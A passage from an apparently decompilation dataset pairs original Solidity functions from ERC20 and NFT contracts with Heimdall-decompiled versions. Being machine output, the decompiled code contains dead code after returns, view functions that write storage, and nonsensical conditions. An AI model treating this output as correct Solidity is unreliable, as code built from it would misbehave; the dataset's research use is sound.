0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_e * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_e * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((store_e * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_e * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_e * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_e * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_e * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_e * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_f / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_j) {\n                if (0 - arg1) {\n                }\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_e * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_l) == (address(arg0))) {\n            if (address(store_l) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x67971F0972C03651ab6355eF0ae08c850742614a", "original_solidity_code": "function symbol() external view override returns (string memory) {\\r\\n      return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                var_c = 0x01;\n                var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x40911d42FB92A25D1DDAE18fA24e536ea3294102", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x050355a5eA2d1590C7FBB1aA354b4f698d221b37", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(!(address(msg.sender) == 0), \"ERC20: approve to the zero address\");\n        require(!(address(arg0) == 0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function setDefaultRoyalty(address receiver, uint96 feeNumerator) public onlyOwner {\\n        _setDefaultRoyalty(receiver, feeNumerator);\\n    }", "heimdall_decompiled_code": "function setDefaultRoyalty(address arg0, uint96 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == (uint96(arg1)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(uint96(arg1) > 0x2710), \"ERC2981: royalty fee will exceed salePrice\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x455243323938313a20726f79616c7479206665652077696c6c20657863656564;\n        var_e = 0x2073616c65507269636500000000000000000000000000000000000000000000;\n        require(address(arg0), \"ERC2981: invalid receiver\");\n        uint256 var_f = 0x40 + var_f;\n        address var_a = address(arg0);\n        uint96 var_g = uint96(arg1);\n        store_r = (uint96(arg1) * 0x010000000000000000000000000000000000000000) | (address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x19;\n        var_d = 0x455243323938313a20696e76616c696420726563656976657200000000000000;\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\\n        if (!_exists(tokenId)) revert URIQueryForNonexistentToken();\\n\\n        string memory baseURI = _baseURI();\\n        return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';\\n    }", "heimdall_decompiled_code": "function tokenURI(uint256 arg0) public view {\n        require(!(!0x01 > arg0), \"ERC721Metadata: URI query for nonexistent token\");\n        require(!(arg0 < totalSupply), \"ERC721Metadata: URI query for nonexistent token\");\n        uint256 var_a = arg0;\n        var_b = 0x04;\n        require(!(bytes1(storage_map_n[var_a])), \"ERC721Metadata: URI query for nonexistent token\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2f;\n        var_f = 0x4552433732314d657461646174613a2055524920717565727920666f72206e6f;\n        var_g = 0x6e6578697374656e7420746f6b656e0000000000000000000000000000000000;\n        if (ownere) {\n            require(bytes1(ownere), \"ERC721Metadata: URI query for nonexistent token\");\n            require(bytes1(store_w), \"ERC721Metadata: URI query for nonexistent token\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x22;\n            uint256 var_i = var_i + (0x20 + (((0x1f + (store_w >> 0x01)) / 0x20) * 0x20));\n            bytes32 var_c = store_w >> 0x01;\n            require(!(bytes1(store_w) == ((store_w >> 0x01) < 0x20)), \"ERC721Metadata: URI query for nonexistent token\");\n            require(bytes1(store_w), \"ERC721Metadata: URI query for nonexistent token\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x22;\n            require(!(bytes1(store_w) == ((store_w >> 0x01) < 0x20)), \"ERC721Metadata: URI query for nonexistent token\");\n            require(!(store_w >> 0x01), \"ERC721Metadata: URI query for nonexistent token\");\n            var_a = 0x10;\n            uint256 var_j = storage_map_n[var_a];\n            require(0x1f < (store_w >> 0x01), \"ERC721Metadata: URI query for nonexistent token\");\n            require((0x20 + var_i) + (store_w >> 0x01) > (0x20 + (0x20 + var_i)), \"ERC721Metadata: URI query for nonexistent token\");\n            require(var_i.length > 0, \"ERC721Metadata: URI query for nonexistent token\");\n            require(arg0 < 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000, \"ERC721Metadata: URI query for nonexistent token\");\n            require((arg0 / 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000) < 0x04ee2d6d415b85acef8100000000, \"ERC721Metadata: URI query for nonexistent token\");\n            require(((arg0 / 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000) / 0x04ee2d6d415b85acef8100000000) < 0x2386f26fc10000, \"ERC721Metadata: URI query for nonexistent token\");\n            require((((arg0 / 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000) / 0x04ee2d6d415b85acef8100000000) / 0x2386f26fc10000) < 0x05f5e100, \"ERC721Metadata: URI query for nonexistent token\");\n            require(((((arg0 / 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000) / 0x04ee2d6d415b85acef8100000000) / 0x2386f26fc10000) / 0x05f5e100) < 0x2710, \"ERC721Metadata: URI query for nonexistent token\");\n            require((((((arg0 / 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000) / 0x04ee2d6d415b85acef8100000000) / 0x2386f26fc10000) / 0x05f5e100) / 0x2710) < 0x64, \"ERC721Metadata: URI query for nonexistent token\");\n            require(((((((arg0 / 0x184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000) / 0x04ee2d6d415b85acef8100000000) / 0x2386f26fc10000) / 0x05f5e100) / 0x2710) / 0x64) < 0x0a, \"ERC721Metadata: URI query for nonexistent token\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x41;\n            var_j = 0x80;\n            var_i = var_i + 0xa0;\n            require(!(0x80 > 0xffffffffffffffff), \"ERC721Metadata: URI query for nonexistent token\");\n            var_k = 0x3031323334353637383961626364656600000000000000000000000000000000;\n            require(!0x80, \"ERC721Metadata: URI query for nonexistent token\");\n            require(arg0 / 0x0a, \"ERC721Metadata: URI query for nonexistent token\");\n            uint256 var_l = 0;\n            require(!(0 > var_i.length), \"ERC721Metadata: URI query for nonexistent token\");\n            uint256 var_m = 0;\n            require(!(0 > var_i.length), \"ERC721Metadata: URI query for nonexistent token\");\n            require(bytes1(store_o), \"ERC721Metadata: URI query for nonexistent token\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x22;\n            require(!(bytes1(store_o) == ((store_o >> 0x01) < 0x20)), \"ERC721Metadata: URI query for nonexistent token\");\n            require(!(bytes1(store_o)), \"ERC721Metadata: URI query for nonexistent token\");\n            var_a = 0x11;\n            require(bytes1(store_o) == 0x01, \"ERC721Metadata: URI query for nonexistent token\");\n        }\n        require(arg0 < totalSupply, \"ERC721Metadata: URI query for nonexistent token\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2f;\n        var_f = 0x4552433732314d657461646174613a2055524920717565727920666f72206e6f;\n        var_g = 0x6e6578697374656e7420746f6b656e0000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB347995c9f8c6C7197370bAFe96967c14F9Fdabe", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xdeB109aFB2756A9114CADAcB051fF399a5908EaA", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x989680) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x989680;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x989680) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x989680;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x989680) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x989680;\n                                emit MaxTxAmountUpdated(0x989680);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x90B22290c39A7D7451fb9B7922cB11e701308E97", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x679905CAD3Da37c92fa79d88d865Fb9FF48a8B50", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x2bAa6759eF2a982BBf5619E21eC244eA7a2Ee3C4", "original_solidity_code": "function initToken(address addr) public onlyowner{\r\n        token3 = IERC20(addr);\r\n    }", "heimdall_decompiled_code": "function initToken(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"only owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0a;\n        var_e = 0x6f6e6c79206f776e657200000000000000000000000000000000000000000000;\n        token3 = (address(arg0) * 0x01) | (uint96(token3));\n    }"}
{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function updateMaxSwap(uint256 newAmount) external onlyOwner {\\n        maxSwapAmount = newAmount * (10 ** 18);\\n    }", "heimdall_decompiled_code": "function updateMaxSwap(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((arg0 == ((arg0 * 0x0de0b6b3a7640000) / 0x0de0b6b3a7640000)) | !0x0de0b6b3a7640000);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        maxSwapAmount = arg0 * 0x0de0b6b3a7640000;\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x14;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x0a2746D0FE88EeB9538183408295c061593E478e", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_f) {\n            if (store_f - ((store_f / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_f / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_f / 0x02;\n                if (store_f) {\n                    if (store_f - ((store_f / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_f / 0x02) {\n                            if (0x1f < (store_f / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_f / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2196c73Bee850827528bf2e164c33441834dFe03", "original_solidity_code": "function balanceOf(address owner) public view virtual override returns (uint256) {\r\n        if (owner == address(0)) revert BalanceQueryForZeroAddress();\r\n        return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint64) {\n        require(arg0 == (address(arg0)));\n        require(address(arg0), CustomError_8f4eb604());\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = uint64(storage_map_b[var_a]);\n        return uint64(storage_map_b[var_a]);\n        var_c = 0x8f4eb60400000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7435b0C4566F7eDe8d922841290a9cc552e1b96b", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAA37BDBBDa27BF560913F99C7B189D5B03583F7D", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEaE65155951A1B2D3Ca8C6fc19194583233B57f4", "original_solidity_code": "function setMaxamount(uint256 newTxAmt) external onlyOwner {\r\n        _maxTxAmount = _tTotal * newTxAmt/100;\r\n        require(newTxAmt >=1);\r\n    }", "heimdall_decompiled_code": "function setMaxamount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            require(0x09);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require((0x01 == 0x01) | !0x3b9aca00);\n            require(0x0a);\n            require(0x0a == 0x01);\n            require(0x0a == 0x02);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x09 > 0xff);\n            require(!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20)));\n            require(!0x09 > 